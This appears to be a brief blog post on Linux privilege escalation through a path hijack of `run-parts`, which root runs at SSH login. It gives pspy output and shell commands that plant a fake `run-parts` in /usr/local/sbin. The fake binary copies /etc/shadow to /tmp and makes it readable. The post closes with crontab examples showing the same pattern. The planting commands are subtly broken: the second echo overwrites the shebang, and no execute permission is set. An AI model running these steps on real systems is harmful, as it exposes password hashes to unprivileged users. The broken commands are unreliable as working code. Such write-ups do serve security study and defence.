---
layout: post
title: SSH run-parts
description: SSH run-parts
summary: SSH run-parts
tags: [linux,privesc]
minute: 1
---
## Overview
`run-parts` is being run by root whenever a successful ssh login completes. Attacker can crafyt a malicious `run-parts` binary if he can override system paths such as `/usr/local/sbin`.

This is a type of path injection attack.

## Steps
* Ensure you have write permission to `/usr/local/sbin`
* Use `pspy`  to monitor the process inside victim machine. Open another terminal and SSH to victim again.

```bash
$ ./pspy -f
[...redacted...]
2021/11/05 23:59:17 CMD: UID=0    PID=2090   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
[...redacted...]

# 2 things to notice:
#  - run-parts is not using full path
#  - it is running as UID=0 which is root
```

* Craft malicuous binary

```bash
echo '#!/bin/bash' > /usr/local/sbin/run-parts
echo 'cp /etc/shadow /tmp; chmod +r /tmp/shadow' > /usr/local/sbin/run-parts
```

* Try SSH login again. You should be able to read now the shadow file.

## Some takeways
Even on modern linux systems, `run-parts` still have this behaviour. As an example, here is what I saw from my kali machine.

```bash
➜  linux cat /etc/crontab | grep run-parts
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
➜  linux
```
